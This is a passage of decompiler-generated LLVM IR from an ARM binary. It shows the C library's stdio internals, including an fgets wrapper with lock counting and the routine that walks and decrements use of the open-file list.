dec_label_pc_15f38.dec_label_pc_15f2c_crit_edge:  ; preds = %dec_label_pc_15f38
  %v0_15f2c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15f30.pre = load i32, i32* @r4, align 4
  %v1_15f2c = inttoptr i32 %v0_15f2c.pre to i32*
  %v2_15f2c = load i32, i32* %v1_15f2c, align 4
  store i32 %v2_15f2c, i32* %r3.global-to-local, align 4
  %v3_15f30 = icmp uge i32 %v2_15f2c, %v1_15f30.pre
  store i1 %v3_15f30, i1* %cpsr_c.global-to-local, align 1
  %v9_15f30 = icmp eq i32 %v2_15f2c, %v1_15f30.pre
  br i1 %v9_15f30, label %dec_label_pc_15f38, label %dec_label_pc_15f50

dec_label_pc_15f4c:                               ; preds = %dec_label_pc_15f38
  %v0_15f4c = load i32, i32* @r4, align 4
  store i32 %v0_15f4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15f50

dec_label_pc_15f50:                               ; preds = %dec_label_pc_15f1c, %dec_label_pc_15f38.dec_label_pc_15f2c_crit_edge, %dec_label_pc_15f4c
  %v0_15f50 = phi i32 [ %v0_15f4c, %dec_label_pc_15f4c ], [ %v2_15f2c37, %dec_label_pc_15f1c ], [ %v2_15f2c, %dec_label_pc_15f38.dec_label_pc_15f2c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f50 = icmp eq i32 %v0_15f50, 0
  br i1 %v2_15f50, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_15f50
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_15f50, %bb
  store i32 89948, i32* @lr, align 4
  %v1_15f58 = xor i1 %v2_15f50, true
  call void @__pseudo_cond_branch(i1 %v1_15f58, i32 ptrtoint (i32* @global_var_13c0c.506 to i32))
  %v0_15f5c = load i32, i32* @r8, align 4
  %v1_15f5c = load i32, i32* @r7, align 4
  %v2_15f5c = add i32 %v1_15f5c, 64
  %v3_15f5c = inttoptr i32 %v2_15f5c to i32*
  store i32 %v0_15f5c, i32* %v3_15f5c, align 4
  br label %dec_label_pc_15f60

dec_label_pc_15f60:                               ; preds = %dec_label_pc_15f08, %bb20
  %v0_15f60 = load i32, i32* @r7, align 4
  %v1_15f60 = add i32 %v0_15f60, 60
  %v2_15f60 = inttoptr i32 %v1_15f60 to i32*
  %v3_15f60 = load i32, i32* %v2_15f60, align 4
  %v1_15f64 = add i32 %v3_15f60, 1
  store i32 %v1_15f64, i32* %r3.global-to-local, align 4
  store i32 %v1_15f64, i32* %v2_15f60, align 4
  %v0_15f6c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_15f70.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_15f74.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15f6c

dec_label_pc_15f6c:                               ; preds = %entry, %dec_label_pc_15f60
  %v0_15f74 = phi i32 [ %arg3, %entry ], [ %v0_15f74.pre, %dec_label_pc_15f60 ]
  %v0_15f70 = phi i32 [ %arg2, %entry ], [ %v0_15f70.pre, %dec_label_pc_15f60 ]
  %v0_15f6c = phi i32 [ %arg1, %entry ], [ %v0_15f6c.pre, %dec_label_pc_15f60 ]
  store i32 %v0_15f70, i32* %r1.global-to-local, align 4
  store i32 %v0_15f74, i32* %r2.global-to-local, align 4
  %v3_15f78 = inttoptr i32 %v0_15f6c to i8*
  %v4_15f78 = call i32 @__GI_fgets_unlocked(i8* %v3_15f78, i32 %v0_15f70, i32 %v0_15f74)
  %v0_15f7c = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f7c = icmp eq i32 %v0_15f7c, 0
  store i32 %v4_15f78, i32* %r8.global-to-local, align 4
  br i1 %v2_15f7c, label %dec_label_pc_15f88, label %dec_label_pc_15ffc

dec_label_pc_15f88:                               ; preds = %dec_label_pc_15f6c
  %v0_15f88 = load i32, i32* @r7, align 4
  %v1_15f88 = add i32 %v0_15f88, 60
  %v2_15f88 = inttoptr i32 %v1_15f88 to i32*
  %v3_15f88 = load i32, i32* %v2_15f88, align 4
  %v1_15f8c = add i32 %v3_15f88, -1
  store i32 %v1_15f8c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f90 = icmp eq i32 %v1_15f8c, 0
  store i32 %v1_15f8c, i32* %v2_15f88, align 4
  br i1 %v2_15f90, label %dec_label_pc_15f9c, label %dec_label_pc_15ffc

dec_label_pc_15f9c:                               ; preds = %dec_label_pc_15f88
  %v0_15f9c = load i32, i32* %r3.global-to-local, align 4
  %v1_15f9c = load i32, i32* @r7, align 4
  %v2_15f9c = add i32 %v1_15f9c, 64
  %v3_15f9c = inttoptr i32 %v2_15f9c to i32*
  store i32 %v0_15f9c, i32* %v3_15f9c, align 4
  %v0_15fa0 = load i32, i32* @r7, align 4
  %v1_15fa0 = add i32 %v0_15fa0, 56
  store i32 %v1_15fa0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15fa4

dec_label_pc_15fa4:                               ; preds = %dec_label_pc_15fd4.dec_label_pc_15fa4_crit_edge, %dec_label_pc_15f9c
  %v0_15fac = phi i32 [ %v0_15fac.pre, %dec_label_pc_15fd4.dec_label_pc_15fa4_crit_edge ], [ %v1_15fa0, %dec_label_pc_15f9c ]
  %v0_15fa4 = phi i32 [ %v0_15fa4.pre, %dec_label_pc_15fd4.dec_label_pc_15fa4_crit_edge ], [ %v0_15fa0, %dec_label_pc_15f9c ]
  %v1_15fa4 = add i32 %v0_15fa4, 56
  %v2_15fa4 = inttoptr i32 %v1_15fa4 to i32*
  %v3_15fa4 = load i32, i32* %v2_15fa4, align 4
  store i32 %v3_15fa4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15fac, i32* %r2.global-to-local, align 4
  %v1_15fb024 = inttoptr i32 %v0_15fac to i32*
  %v2_15fb025 = load i32, i32* %v1_15fb024, align 4
  store i32 %v2_15fb025, i32* %r3.global-to-local, align 4
  %v3_15fb427 = icmp uge i32 %v2_15fb025, %v3_15fa4
  store i1 %v3_15fb427, i1* %cpsr_c.global-to-local, align 1
  %v9_15fb433 = icmp eq i32 %v2_15fb025, %v3_15fa4
  br i1 %v9_15fb433, label %dec_label_pc_15fbc, label %dec_label_pc_15fd4

dec_label_pc_15fbc:                               ; preds = %dec_label_pc_15fa4, %dec_label_pc_15fbc.dec_label_pc_15fb0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15fcc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15fcc, label %dec_label_pc_15fd0, label %dec_label_pc_15fbc.dec_label_pc_15fb0_crit_edge

dec_label_pc_15fbc.dec_label_pc_15fb0_crit_edge:  ; preds = %dec_label_pc_15fbc
  %v0_15fb0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15fb4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15fb0 = inttoptr i32 %v0_15fb0.pre to i32*
  %v2_15fb0 = load i32, i32* %v1_15fb0, align 4
  store i32 %v2_15fb0, i32* %r3.global-to-local, align 4
  %v3_15fb4 = icmp uge i32 %v2_15fb0, %v1_15fb4.pre
  store i1 %v3_15fb4, i1* %cpsr_c.global-to-local, align 1
  %v9_15fb4 = icmp eq i32 %v2_15fb0, %v1_15fb4.pre
  br i1 %v9_15fb4, label %dec_label_pc_15fbc, label %dec_label_pc_15fd4

dec_label_pc_15fd0:                               ; preds = %dec_label_pc_15fbc
  %v0_15fd0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15fd0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15fd4

dec_label_pc_15fd4:                               ; preds = %dec_label_pc_15fa4, %dec_label_pc_15fbc.dec_label_pc_15fb0_crit_edge, %dec_label_pc_15fd0
  %v0_15fdc = phi i32 [ %v0_15fd0, %dec_label_pc_15fd0 ], [ %v2_15fb025, %dec_label_pc_15fa4 ], [ %v2_15fb0, %dec_label_pc_15fbc.dec_label_pc_15fb0_crit_edge ]
  %v1_15fd4 = phi i32 [ %v0_15fd0, %dec_label_pc_15fd0 ], [ %v3_15fa4, %dec_label_pc_15fa4 ], [ %v1_15fb4.pre, %dec_label_pc_15fbc.dec_label_pc_15fb0_crit_edge ]
  %v3_15fd4 = icmp uge i32 %v0_15fdc, %v1_15fd4
  store i1 %v3_15fd4, i1* %cpsr_c.global-to-local, align 1
  %v9_15fd4 = icmp eq i32 %v0_15fdc, %v1_15fd4
  br i1 %v9_15fd4, label %dec_label_pc_15fdc, label %dec_label_pc_15fd4.dec_label_pc_15fa4_crit_edge

dec_label_pc_15fd4.dec_label_pc_15fa4_crit_edge:  ; preds = %dec_label_pc_15fd4
  %v0_15fa4.pre = load i32, i32* @r7, align 4
  %v0_15fac.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15fa4

dec_label_pc_15fdc:                               ; preds = %dec_label_pc_15fd4
  %v2_15fdc = icmp ne i32 %v1_15fd4, 0
  store i1 %v2_15fdc, i1* %cpsr_c.global-to-local, align 1
  %v7_15fe0 = icmp slt i32 %v1_15fd4, 2
  br i1 %v7_15fe0, label %dec_label_pc_15ffc, label %dec_label_pc_15fe4

dec_label_pc_15fe4:                               ; preds = %dec_label_pc_15fdc
  %v0_15fe8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15fe8 = add i32 %v0_15fe8, 129
  store i32 %v1_15fe8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15ffc

dec_label_pc_15ffc:                               ; preds = %dec_label_pc_15f88, %dec_label_pc_15f6c, %dec_label_pc_15fe4, %dec_label_pc_15fdc
  %v0_15ffc = load i32, i32* %r8.global-to-local, align 4
  %v2_16000 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_16000, i32* %r4.global-to-local, align 4
  store i32 %v6_15eec, i32* @r5, align 4
  store i32 %v9_15eec, i32* @r6, align 4
  store i32 %v12_15eec, i32* @r7, align 4
  store i32 %v15_15eec, i32* @r8, align 4
  store i32 %v24_15eec, i32* @lr, align 4
  ret i32 %v0_15ffc

; uselistorder directives
  uselistorder i32 %v0_15fd0, { 1, 0, 2 }
  uselistorder i32 %v1_15fb4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_15f70, { 1, 0 }
  uselistorder i32 %v0_15f74, { 1, 0 }
  uselistorder i32 %v1_15f30.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 1, 6, 7, 8, 9, 11, 10, 0, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 11, 12, 9, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_15ffc, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_15fd4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15fbc, { 1, 0 }
  uselistorder label %dec_label_pc_15f6c, { 1, 0 }
  uselistorder label %dec_label_pc_15f60, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_15f50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15f38, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16008 = load i32, i32* @r4, align 4
  store i32 %v3_16008, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r5.global-to-local, align 4
  %v4_16018 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 160) to i32*), align 4
  store i32 %v4_16018, i32* %r7.global-to-local, align 4
  %v0_1601c = call i32 @__aeabi_read_tp()
  store i32 %v0_1601c, i32* %r0.global-to-local, align 4
  %v1_16020 = add i32 %v4_16018, 8
  %v2_16020 = inttoptr i32 %v1_16020 to i32*
  %v3_16020 = load i32, i32* %v2_16020, align 4
  store i32 %v3_16020, i32* %r3.global-to-local, align 4
  %v1_16024 = add i32 %v0_1601c, -1168
  store i32 %v1_16024, i32* %r6.global-to-local, align 4
  %v3_16028 = icmp uge i32 %v3_16020, %v1_16024
  store i1 %v3_16028, i1* %cpsr_c.global-to-local, align 1
  %v9_16028 = icmp eq i32 %v3_16020, %v1_16024
  br i1 %v9_16028, label %dec_label_pc_16074, label %dec_label_pc_16034

dec_label_pc_16034:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16018, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1604093 = inttoptr i32 %v4_16018 to i32*
  %v2_1604094 = load i32, i32* %v1_1604093, align 4
  store i32 %v2_1604094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1604496 = icmp eq i32 %v2_1604094, 0
  br i1 %v9_1604496, label %dec_label_pc_1604c, label %dec_label_pc_16064

dec_label_pc_1604c:                               ; preds = %dec_label_pc_16034, %dec_label_pc_1604c.dec_label_pc_16040_crit_edge
  %v0_1604c97 = phi i32 [ %v1_16044.pre, %dec_label_pc_1604c.dec_label_pc_16040_crit_edge ], [ 0, %dec_label_pc_16034 ]
  store i32 %v0_1604c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1605c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1605c, label %dec_label_pc_16060, label %dec_label_pc_1604c.dec_label_pc_16040_crit_edge

dec_label_pc_1604c.dec_label_pc_16040_crit_edge:  ; preds = %dec_label_pc_1604c
  %v0_16040.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16044.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16040 = inttoptr i32 %v0_16040.pre to i32*
  %v2_16040 = load i32, i32* %v1_16040, align 4
  store i32 %v2_16040, i32* %r3.global-to-local, align 4
  %v3_16044 = icmp uge i32 %v2_16040, %v1_16044.pre
  store i1 %v3_16044, i1* %cpsr_c.global-to-local, align 1
  %v9_16044 = icmp eq i32 %v2_16040, %v1_16044.pre
  br i1 %v9_16044, label %dec_label_pc_1604c, label %dec_label_pc_16064

dec_label_pc_16060:                               ; preds = %dec_label_pc_1604c
  %v0_16060 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16060, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16064

dec_label_pc_16064:                               ; preds = %dec_label_pc_16034, %dec_label_pc_1604c.dec_label_pc_16040_crit_edge, %dec_label_pc_16060
  %v0_16064 = phi i32 [ %v0_16060, %dec_label_pc_16060 ], [ %v2_1604094, %dec_label_pc_16034 ], [ %v2_16040, %dec_label_pc_1604c.dec_label_pc_16040_crit_edge ]
  %v1_16064 = phi i32 [ %v0_16060, %dec_label_pc_16060 ], [ 0, %dec_label_pc_16034 ], [ %v1_16044.pre, %dec_label_pc_1604c.dec_label_pc_16040_crit_edge ]
  %v3_16064 = icmp uge i32 %v0_16064, %v1_16064
  store i1 %v3_16064, i1* %cpsr_c.global-to-local, align 1
  %v9_16064 = icmp eq i32 %v0_16064, %v1_16064
  br i1 %v9_16064, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_16064
  %v1_16068 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16068, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_16064, %bb
  %v1_1606c = xor i1 %v9_16064, true
  call void @__pseudo_cond_branch(i1 %v1_1606c, i32 ptrtoint (i32* @global_var_13c0c.506 to i32))
  %v0_16070 = load i32, i32* %r6.global-to-local, align 4
  %v1_16070 = load i32, i32* %r7.global-to-local, align 4
  %v2_16070 = add i32 %v1_16070, 8
  %v3_16070 = inttoptr i32 %v2_16070 to i32*
  store i32 %v0_16070, i32* %v3_16070, align 4
  br label %dec_label_pc_16074

dec_label_pc_16074:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16078 = load i32, i32* %r5.global-to-local, align 4
  %v2_16078 = add i32 %v0_16078, 160
  %v3_16078 = inttoptr i32 %v2_16078 to i32*
  %v4_16078 = load i32, i32* %v3_16078, align 4
  store i32 %v4_16078, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16080 = add i32 %v0_16078, 12
  %v3_16080 = inttoptr i32 %v2_16080 to i32*
  %v4_16080 = load i32, i32* %v3_16080, align 4
  store i32 %v4_16080, i32* %r3.global-to-local, align 4
  %v1_16084 = inttoptr i32 %v4_16080 to i32*
  %v2_16084 = load i32, i32* %v1_16084, align 4
  store i32 %v2_16084, i32* %r1.global-to-local, align 4
  %v1_16088 = add i32 %v4_16078, 4
  %v2_16088 = inttoptr i32 %v1_16088 to i32*
  %v3_16088 = load i32, i32* %v2_16088, align 4
  %v2_1608c = icmp ne i32 %v2_16084, 0
  store i1 %v2_1608c, i1* %cpsr_c.global-to-local, align 1
  %v7_1608c = icmp eq i32 %v2_16084, 1
  %v1_16090 = add i32 %v3_16088, 1
  store i32 %v1_16090, i32* %r3.global-to-local, align 4
  store i32 %v1_16090, i32* %v2_16088, align 4
  br i1 %v7_1608c, label %dec_label_pc_1609c, label %dec_label_pc_16200

dec_label_pc_1609c:                               ; preds = %dec_label_pc_16074
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_160a0 = load i32, i32* %r5.global-to-local, align 4
  %v2_160a0 = add i32 %v0_160a0, 80
  %v3_160a0 = inttoptr i32 %v2_160a0 to i32*
  %v4_160a0 = load i32, i32* %v3_160a0, align 4
  store i32 %v4_160a0, i32* %r3.global-to-local, align 4
  %v1_160a4 = inttoptr i32 %v4_160a0 to i32*
  %v2_160a4 = load i32, i32* %v1_160a4, align 4
  store i32 %v2_160a4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_160a4, 1
  br i1 %tmp46, label %dec_label_pc_16200, label %dec_label_pc_160b0

dec_label_pc_160b0:                               ; preds = %dec_label_pc_1609c
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_160b4 = add i32 %v0_160a0, 152
  %v3_160b4 = inttoptr i32 %v2_160b4 to i32*
  %v4_160b4 = load i32, i32* %v3_160b4, align 4
  store i32 %v4_160b4, i32* %r7.global-to-local, align 4
  %v1_160b8 = add i32 %v4_160b4, 8
  %v2_160b8 = inttoptr i32 %v1_160b8 to i32*
  %v3_160b8 = load i32, i32* %v2_160b8, align 4
  store i32 %v3_160b8, i32* %r3.global-to-local, align 4
  %v1_160bc = load i32, i32* %r6.global-to-local, align 4
  %v3_160bc = icmp uge i32 %v3_160b8, %v1_160bc
  store i1 %v3_160bc, i1* %cpsr_c.global-to-local, align 1
  %v9_160bc = icmp eq i32 %v3_160b8, %v1_160bc
  br i1 %v9_160bc, label %dec_label_pc_16100, label %dec_label_pc_160c4

dec_label_pc_160c4:                               ; preds = %dec_label_pc_160b0
  store i32 %v4_160b4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_160cc86 = inttoptr i32 %v4_160b4 to i32*
  %v2_160cc87 = load i32, i32* %v1_160cc86, align 4
  store i32 %v2_160cc87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_160d089 = icmp eq i32 %v2_160cc87, 0
  br i1 %v9_160d089, label %dec_label_pc_160d8, label %dec_label_pc_160f0

dec_label_pc_160d8:                               ; preds = %dec_label_pc_160c4, %dec_label_pc_160d8.dec_label_pc_160cc_crit_edge
  %v0_160d890 = phi i32 [ %v1_160d0.pre, %dec_label_pc_160d8.dec_label_pc_160cc_crit_edge ], [ 0, %dec_label_pc_160c4 ]
  store i32 %v0_160d890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_160e8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_160e8, label %dec_label_pc_160ec, label %dec_label_pc_160d8.dec_label_pc_160cc_crit_edge

dec_label_pc_160d8.dec_label_pc_160cc_crit_edge:  ; preds = %dec_label_pc_160d8
  %v0_160cc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_160d0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_160cc = inttoptr i32 %v0_160cc.pre to i32*
  %v2_160cc = load i32, i32* %v1_160cc, align 4
  store i32 %v2_160cc, i32* %r3.global-to-local, align 4
  %v3_160d0 = icmp uge i32 %v2_160cc, %v1_160d0.pre
  store i1 %v3_160d0, i1* %cpsr_c.global-to-local, align 1
  %v9_160d0 = icmp eq i32 %v2_160cc, %v1_160d0.pre
  br i1 %v9_160d0, label %dec_label_pc_160d8, label %dec_label_pc_160f0

dec_label_pc_160ec:                               ; preds = %dec_label_pc_160d8
  %v0_160ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_160ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_160f0

dec_label_pc_160f0:                               ; preds = %dec_label_pc_160c4, %dec_label_pc_160d8.dec_label_pc_160cc_crit_edge, %dec_label_pc_160ec
  %v0_160f0 = phi i32 [ %v0_160ec, %dec_label_pc_160ec ], [ %v2_160cc87, %dec_label_pc_160c4 ], [ %v2_160cc, %dec_label_pc_160d8.dec_label_pc_160cc_crit_edge ]
  %v1_160f0 = phi i32 [ %v0_160ec, %dec_label_pc_160ec ], [ 0, %dec_label_pc_160c4 ], [ %v1_160d0.pre, %dec_label_pc_160d8.dec_label_pc_160cc_crit_edge ]
  %v3_160f0 = icmp uge i32 %v0_160f0, %v1_160f0
  store i1 %v3_160f0, i1* %cpsr_c.global-to-local, align 1
  %v9_160f0 = icmp eq i32 %v0_160f0, %v1_160f0
  br i1 %v9_160f0, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_160f0
  %v1_160f4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_160f4, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_160f0, %bb47
  %v1_160f8 = xor i1 %v9_160f0, true
  call void @__pseudo_cond_branch(i1 %v1_160f8, i32 ptrtoint (i32* @global_var_13c0c.506 to i32))
  %v0_160fc = load i32, i32* %r6.global-to-local, align 4
  %v1_160fc = load i32, i32* %r7.global-to-local, align 4
  %v2_160fc = add i32 %v1_160fc, 8
  %v3_160fc = inttoptr i32 %v2_160fc to i32*
  store i32 %v0_160fc, i32* %v3_160fc, align 4
  %v0_16108.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16100

dec_label_pc_16100:                               ; preds = %dec_label_pc_160b0, %bb48
  %v0_16108 = phi i32 [ %v0_160a0, %dec_label_pc_160b0 ], [ %v0_16108.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_16108 = add i32 %v0_16108, 152
  %v3_16108 = inttoptr i32 %v2_16108 to i32*
  %v4_16108 = load i32, i32* %v3_16108, align 4
  store i32 %v4_16108, i32* %r0.global-to-local, align 4
  %v2_1610c = add i32 %v0_16108, 76
  %v3_1610c = inttoptr i32 %v2_1610c to i32*
  %v4_1610c = load i32, i32* %v3_1610c, align 4
  store i32 %v4_1610c, i32* %r2.global-to-local, align 4
  %v1_16110 = add i32 %v4_16108, 4
  %v2_16110 = inttoptr i32 %v1_16110 to i32*
  %v3_16110 = load i32, i32* %v2_16110, align 4
  store i32 %v3_16110, i32* %r3.global-to-local, align 4
  %v1_16114 = inttoptr i32 %v4_1610c to i32*
  %v2_16114 = load i32, i32* %v1_16114, align 4
  store i32 %v2_16114, i32* %r2.global-to-local, align 4
  %v1_16118 = add i32 %v3_16110, 1
  store i32 %v1_16118, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_16118, i32* %v2_16110, align 4
  %v0_16168.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1616811 = icmp eq i32 %v0_16168.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1616811, label %dec_label_pc_16174, label %dec_label_pc_1612c

dec_label_pc_1612c:                               ; preds = %dec_label_pc_16100, %dec_label_pc_16164
  %v0_161502 = phi i32 [ %v0_16164, %dec_label_pc_16164 ], [ %v0_16168.pr, %dec_label_pc_16100 ]
  %v1_1612c = inttoptr i32 %v0_161502 to i16*
  %v2_1612c = load i16, i16* %v1_1612c, align 2
  %v3_1612c = zext i16 %v2_1612c to i32
  store i32 %v3_1612c, i32* %r3.global-to-local, align 4
  %v2_16130 = and i32 %v3_1612c, 32816
  store i32 %v2_16130, i32* %r1.global-to-local, align 4
  %v2_16134 = icmp ugt i32 %v2_16130, 47
  store i1 %v2_16134, i1* %cpsr_c.global-to-local, align 1
  %v7_16134 = icmp eq i32 %v2_16130, 48
  %v1_16138 = add i32 %v0_161502, 32
  %v2_16138 = inttoptr i32 %v1_16138 to i32*
  %v3_16138 = load i32, i32* %v2_16138, align 4
  store i32 %v3_16138, i32* %r4.global-to-local, align 4
  br i1 %v7_16134, label %dec_label_pc_16144, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_1612c
  store i32 %v0_161502, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16164

dec_label_pc_16144:                               ; preds = %dec_label_pc_1612c
  %v0_16144 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16144 = icmp eq i32 %v0_16144, 0
  br i1 %v2_16144, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_16144
  %v1_16148 = load i32, i32* %r5.global-to-local, align 4
  %v2_16148 = load i32, i32* %r7.global-to-local, align 4
  %v3_16148 = add i32 %v2_16148, %v1_16148
  %v4_16148 = inttoptr i32 %v3_16148 to i32*
  %v5_16148 = load i32, i32* %v4_16148, align 4
  store i32 %v5_16148, i32* %r3.global-to-local, align 4
  %v3_1614c = inttoptr i32 %v5_16148 to i32*
  store i32 %v3_16138, i32* %v3_1614c, align 4
  %v0_16150 = load i32, i32* %r2.global-to-local, align 4
  %v1_16150 = inttoptr i32 %v0_16150 to i16*
  %v2_16150 = load i16, i16* %v1_16150, align 2
  %v3_16150 = zext i16 %v2_16150 to i32
  store i32 %v3_16150, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_16144
  %v2_161508 = load i16, i16* %v1_1612c, align 2
  %v3_161509 = zext i16 %v2_161508 to i32
  store i32 %v3_161509, i32* %r3.global-to-local, align 4
  %v3_16154 = add i32 %v0_16144, 32
  %v4_16154 = inttoptr i32 %v3_16154 to i32*
  store i32 %v3_16138, i32* %v4_16154, align 4
  %v0_16158.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_16158 = phi i32 [ %v3_16150, %.thread ], [ %v0_16158.pre, %bb49 ]
  %v1_16158 = and i32 %v0_16158, 8192
  %v2_16158 = icmp eq i32 %v1_16158, 0
  br i1 %v2_16158, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_1615c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1615c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_16160 = xor i1 %v2_16158, true
  call void @__pseudo_cond_branch(i1 %v1_16160, i32 ptrtoint (i32* @global_var_12a54.33 to i32))
  %v0_16164.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16164

dec_label_pc_16164:                               ; preds = %.thread38, %bb52
  %v0_16164 = phi i32 [ %v0_16164.pre, %bb52 ], [ %v3_16138, %.thread38 ]
  store i32 %v0_16164, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16168 = icmp eq i32 %v0_16164, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_16168, label %dec_label_pc_16174, label %dec_label_pc_1612c

dec_label_pc_16174:                               ; preds = %dec_label_pc_16164, %dec_label_pc_16100
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16178 = load i32, i32* %r5.global-to-local, align 4
  %v2_16178 = add i32 %v0_16178, 152
  %v3_16178 = inttoptr i32 %v2_16178 to i32*
  %v4_16178 = load i32, i32* %v3_16178, align 4
  store i32 %v4_16178, i32* %r0.global-to-local, align 4
  %v1_1617c = add i32 %v4_16178, 4
  %v2_1617c = inttoptr i32 %v1_1617c to i32*
  %v3_1617c = load i32, i32* %v2_1617c, align 4
  %v1_16180 = add i32 %v3_1617c, -1
  store i32 %v1_16180, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16184 = icmp eq i32 %v1_16180, 0
  store i32 %v1_16180, i32* %v2_1617c, align 4
